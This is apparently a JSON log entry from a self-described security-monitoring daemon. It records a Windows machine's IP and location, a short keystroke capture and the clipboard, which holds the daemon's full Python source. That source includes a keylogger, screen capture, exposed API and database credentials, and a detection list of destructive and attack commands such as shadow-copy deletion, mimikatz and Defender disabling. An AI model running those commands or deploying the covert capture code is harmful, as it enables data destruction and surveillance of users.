{"timestamp": "2025-06-10T17:48:26.207955", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime, timedelta\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\nimport shutil\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\n# json_log_path = os.path.join(base_path, \"snakey_log.json\") # NO LONGER USED FOR MAIN LOGS\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\" # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"] # Example: only trust Spain access\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === Sensitive Command Detection Configuration ===\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\",                # Formatting drives\r\n    \"del /s /q\",                # Force delete (subdirectories, quiet)\r\n    \"rmdir /s /q\",              # Force remove directory (subdirectories, quiet)\r\n    \"net user\",                 # User management (info or creation)\r\n    \"net localgroup administrators\", # Admin group checks\r\n    \"taskkill /f /im\",          # Force kill process by image name\r\n    \"schtasks /create\",         # Create scheduled tasks (persistence)\r\n    \"reg delete\",               # Delete registry keys\r\n    \"mimikatz\",                 # Credential dumping tool\r\n    \"certutil -urlcache -f -split\", # Common technique for downloading files\r\n    \"wmic shadowcopy delete\",   # Delete volume shadow copies (often pre-ransomware)\r\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\r\n    \"powershell -nop -w hidden -c\", # Common PowerShell obfuscation for execution\r\n    \"invoke-expression\",        # PowerShell alias for 'iex' - executes strings as commands\r\n    \"set-mppreference -disablerealtimemonitoring $true\", # Disable Windows Defender\r\n    \"bcdedit /set {current} safeboot network\", # Set network safe mode (persistence/bypass)\r\n    \"mshta.exe http\",           # HTML Application (often for remote code execution)\r\n    \"bitsadmin /transfer\",      # Download files via BITS\r\n    \"wevtutil cl system\",       # Clear event logs\r\n    \"cipher /w\",                # Overwrite free space (anti-forensics)\r\n    \"sdelete -z\",               # Secure delete tool\r\n]\r\n\r\n# === Logging Function ===\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip()) # Also print to console for immediate feedback\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip()) # Still print even if file write fails\r\n\r\n# === Encryption Key Loading ===\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD), verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    response.raw.read(1) # Read a byte to force connection establishment\r\n    response.close() # Close the connection\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\", f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,\r\n            ssl_show_warn=False,\r\n            request_timeout=30\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster.\")\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\r\n        return None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1]) # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        # VirusTotal expects a URL to be URL-safe base64 encoded for API v3 lookup,\r\n        # but the original code uses SHA256. Sticking to SHA256 for now,\r\n        # but be aware this might not be the correct VT v3 URL ID format.\r\n        # For correct VT v3 URL lookup, you'd typically need to base64 encode the URL.\r\n        # Example: base64.urlsafe_b64encode(url.encode()).decode().strip(\"=\")\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        if not os.path.exists(file_path):\r\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash: # If hashing failed\r\n            return {}\r\n\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n             log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            # Ensure timestamp is ISO format for Elasticsearch\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty before sending for Kibana visualization\r\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = [] # Ensure it's an empty list if no alerts\r\n\r\n            log_daemon_message(\"DEBUG\", f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n    else:\r\n        log_daemon_message(\"WARNING\", \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n# === New: Analyze Clipboard for Sensitive Commands ===\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\r\n    \"\"\"\r\n    Analyzes clipboard content for predefined sensitive command patterns.\r\n    Adds alerts to the alerts_list if matches are found.\r\n    \"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            # Continue to find all matches in the clipboard, do not break\r\n\r\n    return alerts_list\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session():\r\n    current_time = datetime.now() # Use this for consistent timestamping\r\n    session_log = {\r\n        \"timestamp\": current_time.isoformat(), # Use consistent timestamp\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [], # This list will be populated\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError: # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n            # NEW: Analyze clipboard for sensitive commands\r\n            analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_path = os.path.join(base_path, screenshot_information) # Define path here\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path) # Hash of screenshot image file\r\n\r\n            # VirusTotal Scan for screenshot\r\n            vt_result = vt_lookup_file(screenshot_path)\r\n            if vt_result:\r\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                if vt_result.get(\"malicious\", 0) > 0:\r\n                    session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n            else:\r\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n        finally:\r\n            # Clean up the temporary screenshot file\r\n            if os.path.exists(screenshot_path):\r\n                try:\r\n                    os.remove(screenshot_path)\r\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\r\n                except Exception as e:\r\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    # Ensure clipboard is a string before checking .startswith()\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n        else:\r\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger\r\n    keys = []\r\n    def on_press(key):\r\n        nonlocal keys # Ensure we modify the 'keys' list from outer scope\r\n        try:\r\n            if hasattr(key, 'char') and key.char is not None:\r\n                keys.append(key.char)\r\n            elif key == Key.space:\r\n                keys.append(' ')\r\n            elif key == Key.enter:\r\n                keys.append('[ENTER]')\r\n            elif key == Key.backspace:\r\n                keys.append('[BACKSPACE]')\r\n            elif key == Key.tab:\r\n                keys.append('[TAB]')\r\n            else:\r\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running for 10 seconds. Create 'stop_snakey.txt' to terminate earlier.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10: # Collect keystrokes for 10 seconds\r\n                time.sleep(0.5) # Sleep for shorter intervals to check stop file more often\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n            log_daemon_message(\"INFO\", \"Keylogger session completed.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\r\n        if listener: # Attempt to stop listener cleanly even on error\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\r\n    if session_log[\"alerts\"] is None:\r\n        session_log[\"alerts\"] = []\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    # 1. Prepare the full log for encryption\r\n    # We will hash the raw JSON string content of the log *before* encryption\r\n    # This hash acts as an internal integrity check within the log itself\r\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash) # Store hash of raw log inside\r\n\r\n    # 2. Encrypt the entire session log\r\n    try:\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n        \r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file\r\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\r\n            f_enc.write(encrypted_log_data)\r\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\r\n            return session_log # Exit without updating ledger for this log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\") as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed\r\n                    if ledger and isinstance(ledger[0], str): # Check if old format (list of hashes)\r\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": current_time.isoformat(), # Cannot determine true timestamp for old entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\r\n                except json.JSONDecodeError:\r\n                    log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                    ledger = []\r\n            else:\r\n                ledger = []\r\n\r\n            previous_encrypted_file_hash = ledger[-1][\"encrypted_file_hash\"] if ledger else \"0\" * 64\r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath # Store the path to the encrypted log\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            with open(hash_ledger_path, \"w\") as f:\r\n                json.dump(ledger, f, indent=4)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            with open(merkle_root_path, \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\r\n\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\r\n\r\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session() # This now handles saving encrypted logs and updating ledger\r\n\r\n        # Send the (original, unencrypted) session_log to Wazuh and Elasticsearch\r\n        # These systems need the clear-text data for analysis and display\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(15)\r\n\r\n    # Final cleanup of stop file\r\n    if os.path.exists(stop_file_path):\r\n        try:\r\n            os.remove(stop_file_path)\r\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "sudo", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r 